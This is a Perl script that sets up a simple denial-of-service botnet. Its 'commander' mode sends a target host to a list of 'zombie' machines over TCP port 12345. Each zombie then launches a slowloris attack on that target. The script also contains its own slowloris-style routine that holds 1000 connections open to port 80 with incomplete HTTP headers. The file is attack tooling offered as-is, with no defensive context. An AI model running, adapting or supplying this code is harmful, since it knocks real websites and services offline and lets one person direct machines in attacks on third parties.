#!/usr/bin/perl -w
#
#

use Getopt::Std;
use IO::Socket::INET;
use Net::Address::IP::Local;
use strict;

our($opt_c, $opt_z, $opt_f);
getopts('zcf:');

if($opt_c && $opt_z) {
    die "Please select mode for $0 (commander or zombie)!!!\n";
} elsif($opt_c && $opt_f) {
    print "This is commander mode!!!\n";
    ### Put Client Part ###
    my($ip, @ipList, $i, $pid, @childs, $target);
    print "Please input the target IP or Hostname:";
    while(<STDIN>) {
        $target = $_;
    }
    open(FH, $opt_f) or die "Plz provide the IP addr list!!!\n";
    while($ip = <FH>) {
        chomp $ip;
        push @ipList, $ip;
        #commander($ip);
    }
    for($i = 0; $i <= $#ipList; $i++) {
        $pid = fork();
        if($pid) {
            push @childs, $pid;
        } elsif($pid == 0) {
            commander($ipList[$i], $target);
        } else {
            die "Resources Not Available!!!\n";
        }
    }
    foreach (@childs) {
        waitpid($_,0 );
    }
} elsif($opt_z) {
    print "This is zombie mode!!!\n";
    ### Put Server Part ###
    zombie();
} else {
    die "Usage: perl $0 -f ipAddrList.txt -options!!!\n";
}

sub zombie {
    $| = 1;
    my $l_addr = Net::Address::IP::Local->public_ipv4;
    my $socket = new IO::Socket::INET (
        LocalHost => "$l_addr", 
        LocalPort => '12345', 
        Proto => 'tcp', 
        Listen => '5', 
        Reuse => '1'
    );
    die "Unable to create zombie process $!\n" unless $socket;
    while(1) {
        my $c_socket = $socket->accept();
        my $target = '';
        $c_socket->recv($target, 1024);
        system("/home/jieliau/Tools/slowloris.pl/slowloris.pl -dns $target");
    }
    $socket->close();
}

sub commander {
    my($ipAddr, $targetIP) = @_;
    $| = 1;
    my $socket = new IO::Socket::INET (
        PeerHost => "$ipAddr",
        PeerPort => '12345',
        Proto => 'tcp'
    );
    die "Unable to connect to $ipAddr: $!\n" unless $socket;
    #print "Target IP or HostName: ";
    ###while(<STDIN>) {
    ##    $socket->send($_);
    ##    print "Sending command to zombie!!!\n";
    ##    shutdown($socket, 1);
    ##}
    print "$targetIP\n";
    $socket->send($targetIP);
    print "Sending command to zombie!!!\n";
    shutdown($socket, 1);
    $socket->close();
}

sub dohttpconnection {
    my($target) = @_;
    my($rand, @first, @sock, @working);
    my $num = 1000;
    my $fail_connection = 0;
    $working[$_] = 0 foreach (1..$num);
    $first[$_] = 0 foreach (1..$num);
    while(1) {
        $fail_connection = 0;
        print "Building sockets!!!\n";
        foreach my $i (1..$num) {
            if($working[$i] == 0) {
                if(
                    $sock[$i] = new IO::Socket::INET(
                        PeerAddr => "$target", 
                        PeerPort => "80", 
                        Timeout => "5", 
                        Proto => "tcp"
                    )
                ) {
                    $working[$i] = 1;
                } else {
                    $working[$i] = 0;
                }
                if($working[$i] == 1) {
                    $rand = "";
                }
                my $primarypayload = 
                    "GET/$rand HTTP/1.1\r\n"
                    . "Host: $target\r\n"
                    . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50313; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                    . "Content-Length: 42\r\n";
                my $handle = $sock[$i];
                if($handle) {
                    print $handle "$primarypayload";
                    if($SIG{__WARN__}) {
                        $working[$i] = 0;
                        close $handle;
                        $fail_connection++;
                    } else {
                        $working[$i] = 1;
                    }
                } else {
                    $working[$i] = 0;
                    $fail_connection++;
                }
            }
        }
        print "Sending data!!!\n";
        foreach my $i (1..$num) {
            if($working[$i] == 1) {
                if($sock[$i]) {
                    my $handle = $sock[$i];
                    if(print $handle "X-a: b\r\n") {
                        $working[$i] = 1;
                    } else {
                        $working[$i] = 0;
                        $fail_connection++;
                    }
                } else {
                    $working[$i] = 0;
                    $fail_connection++;
                }
            }
        }
    }
    sleep(100);
}
